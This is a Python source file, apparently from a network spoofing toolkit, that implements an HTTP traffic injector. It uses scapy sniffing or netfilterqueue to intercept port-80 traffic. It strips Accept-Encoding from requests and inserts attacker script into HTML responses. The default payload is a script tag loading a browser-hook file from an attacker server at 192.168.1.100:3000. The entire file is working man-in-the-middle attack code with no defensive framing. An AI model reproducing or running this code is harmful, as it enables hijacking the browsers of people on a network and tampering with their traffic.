from __future__ import annotations

import re
import threading
import time
from typing import Optional, Callable

import scapy.all as scapy
from loguru import logger

from spoof.platform import get_platform


class CodeInjector:

    def __init__(
        self,
        interface: str,
        injection_code: str = '<script src="http://192.168.1.100:3000/hook.js"></script>',
        injection_mode: str = "append",
    ):
        self._interface = interface
        self._injection_code = injection_code
        self._injection_mode = injection_mode
        self._running = False
        self._stats = {"injected": 0, "scanned": 0, "skipped": 0}
        self._lock = threading.Lock()
        self._callbacks: list[Callable] = []
        self._platform = get_platform()

        self._content_length_re = re.compile(
            rb"(?:Content-Length:\s*)(\d*)",
            re.IGNORECASE,
        )
        self._content_type_re = re.compile(
            rb"Content-Type:\s*text/html",
            re.IGNORECASE,
        )
        self._accept_encoding_re = re.compile(
            rb"Accept-Encoding:.*?\r\n",
            re.IGNORECASE,
        )
        self._transfer_encoding_re = re.compile(
            rb"Transfer-Encoding:\s*chunked",
            re.IGNORECASE,
        )
        self._body_close_re = re.compile(rb"</body>", re.IGNORECASE)
        self._head_close_re = re.compile(rb"</head>", re.IGNORECASE)

    @property
    def stats(self) -> dict:
        return dict(self._stats)

    def on_inject(self, callback: Callable) -> None:
        self._callbacks.append(callback)

    def inject_into(self, raw_packet: bytes, src_ip: str, dst_ip: str) -> Optional[bytes]:
        with self._lock:
            self._stats["scanned"] += 1

        try:
            if self._content_type_re.search(raw_packet) is None:
                with self._lock:
                    self._stats["skipped"] += 1
                return None

            load = raw_packet

            load = self._accept_encoding_re.sub(b"", load)

            if self._transfer_encoding_re.search(load):
                return None

            injection = self._injection_code.encode("utf-8")

            if self._injection_mode == "append":
                if self._body_close_re.search(load):
                    load = self._body_close_re.sub(injection + b"</body>", load, count=1)
                else:
                    return None
            elif self._injection_mode == "head":
                if self._head_close_re.search(load):
                    load = self._head_close_re.sub(injection + b"</head>", load, count=1)
                else:
                    return None
            elif self._injection_mode == "prepend":
                header_end = load.find(b"\r\n\r\n")
                if header_end == -1:
                    return None
                load = load[:header_end + 4] + injection + load[header_end + 4:]

            content_length_match = self._content_length_re.search(load)
            if content_length_match:
                try:
                    old_len = int(content_length_match.group(1))
                    new_len = old_len + len(injection)
                    load = load.replace(
                        content_length_match.group(0),
                        f"Content-Length: {new_len}".encode("utf-8"),
                    )
                except (ValueError, IndexError):
                    pass

            with self._lock:
                self._stats["injected"] += 1

            for cb in self._callbacks:
                try:
                    cb(src_ip=src_ip, dst_ip=dst_ip, size=len(injection))
                except Exception:
                    pass

            return load

        except Exception as e:
            logger.debug(f"inject error: {e}")
            return None


class ScapyHTTPInjector(CodeInjector):

    def __init__(self, interface: str, injection_code: str = '<script>alert(1)</script>',
                 injection_mode: str = "append"):
        super().__init__(interface, injection_code, injection_mode)
        self._sniff_thread: Optional[threading.Thread] = None

    def _handle_http(self, packet) -> None:
        try:
            if not packet.haslayer(scapy.Raw) or not packet.haslayer(scapy.TCP):
                return

            tcp = packet[scapy.TCP]
            if tcp.sport != 80:
                return

            raw = bytes(packet[scapy.Raw])
            ip = packet[scapy.IP]

            modified = self.inject_into(raw, ip.dst, ip.src)
            if modified is None:
                return

            try:
                injected_pkt = (
                    scapy.IP(src=ip.src, dst=ip.dst, flags=ip.flags, frag=ip.frag)
                    / scapy.TCP(
                        sport=tcp.sport, dport=tcp.dport,
                        seq=tcp.seq, ack=tcp.ack,
                        flags=tcp.flags, window=tcp.window,
                    )
                    / scapy.Raw(load=modified)
                )
                scapy.sendp(
                    scapy.Ether() / injected_pkt,
                    iface=self._interface,
                    verbose=False,
                )
                logger.debug(f"injected {len(self._injection_code)}B into {ip.src}:{tcp.sport} -> {ip.dst}:{tcp.dport}")
            except Exception as e:
                logger.debug(f"inject send failed: {e}")

        except Exception:
            pass

    def start(self) -> None:
        self._running = True

        def sniff_loop():
            try:
                scapy.sniff(
                    iface=self._interface,
                    filter="tcp port 80",
                    prn=self._handle_http,
                    store=False,
                    stop_filter=lambda _: not self._running,
                )
            except Exception as e:
                if self._running:
                    logger.error(f"injector sniff error: {e}")

        self._sniff_thread = threading.Thread(target=sniff_loop, daemon=True)
        self._sniff_thread.start()
        logger.info(f"http injector started on {self._interface} ({len(self._injection_code)}B payload)")

    def stop(self) -> None:
        self._running = False
        logger.info(f"http injector stopped (injected: {self._stats['injected']}, scanned: {self._stats['scanned']})")


class NfqueueHTTPInjector(CodeInjector):

    def __init__(self, interface: str, injection_code: str = '<script>alert(1)</script>',
                 injection_mode: str = "append", queue_num: int = 0):
        super().__init__(interface, injection_code, injection_mode)
        self._queue_num = queue_num
        self._queue: Optional[object] = None
        self._nfqueue_thread: Optional[threading.Thread] = None

    def _process_packet(self, packet) -> None:
        try:
            scapy_pkt = scapy.IP(packet.get_payload())
            if not scapy_pkt.haslayer(scapy.Raw) or not scapy_pkt.haslayer(scapy.TCP):
                packet.accept()
                return

            tcp = scapy_pkt[scapy.TCP]
            if tcp.dport != 80 and tcp.sport != 80:
                packet.accept()
                return

            raw = bytes(scapy_pkt[scapy.Raw])

            if tcp.dport == 80:
                raw = self._accept_encoding_re.sub(b"", raw)
                if raw != bytes(scapy_pkt[scapy.Raw]):
                    scapy_pkt[scapy.Raw].load = raw
                    del scapy_pkt[scapy.IP].len
                    del scapy_pkt[scapy.IP].chksum
                    del scapy_pkt[scapy.TCP].chksum
                    packet.set_payload(bytes(scapy_pkt))

            elif tcp.sport == 80:
                ip = scapy_pkt[scapy.IP]
                modified = self.inject_into(raw, ip.dst, ip.src)
                if modified is not None:
                    scapy_pkt[scapy.Raw].load = modified
                    del scapy_pkt[scapy.IP].len
                    del scapy_pkt[scapy.IP].chksum
                    del scapy_pkt[scapy.TCP].chksum
                    packet.set_payload(bytes(scapy_pkt))

            packet.accept()

        except Exception as e:
            logger.debug(f"nfqueue inject error: {e}")
            packet.accept()

    def start(self) -> None:
        self._running = True
        try:
            from netfilterqueue import NetfilterQueue
            self._queue = NetfilterQueue()
            self._queue.bind(self._queue_num, self._process_packet)

            self._nfqueue_thread = threading.Thread(target=self._queue.run, daemon=True)
            self._nfqueue_thread.start()
            logger.info(f"nfqueue injector started (queue={self._queue_num}, payload={len(self._injection_code)}B)")
        except ImportError:
            logger.error("netfilterqueue not installed. use: pip install NetfilterQueue")
            self._running = False
        except PermissionError:
            logger.error("root required for netfilterqueue")
            self._running = False

    def stop(self) -> None:
        self._running = False
        if self._queue:
            try:
                self._queue.unbind()
            except Exception:
                pass
        logger.info(f"nfqueue injector stopped (injected: {self._stats['injected']})")


def create_injector(mode: str = "scapy", interface: str = "eth0",
                    injection_code: str = '<script src="http://192.168.1.100:3000/hook.js"></script>',
                    injection_mode: str = "append",
                    queue_num: int = 0):
    if mode == "nfqueue":
        return NfqueueHTTPInjector(
            interface=interface,
            injection_code=injection_code,
            injection_mode=injection_mode,
            queue_num=queue_num,
        )
    return ScapyHTTPInjector(
        interface=interface,
        injection_code=injection_code,
        injection_mode=injection_mode,
    )
